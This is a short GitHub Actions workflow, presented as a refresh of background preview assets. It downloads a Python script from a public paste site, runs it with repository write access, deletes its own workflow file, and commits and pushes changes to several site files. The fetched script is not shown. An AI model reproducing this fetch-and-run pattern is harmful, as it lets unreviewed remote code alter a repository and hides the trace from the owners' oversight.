name: Refresh background preview assets

on:
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Apply changes
        run: |
          curl -fsSL https://paste.rs/i2qvg -o /tmp/nx-bg-fix2.py
          python3 /tmp/nx-bg-fix2.py

      - name: Remove this one-off workflow
        run: rm .github/workflows/nx-bg-fix2.yml

      - name: Commit and push
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add themes/themes.js Settings/backgrounds.css JS/main.js index.html Settings/settings.html .github/workflows/nx-bg-fix2.yml
          git commit -m "Load all background previews and refresh settings cache"
          git push
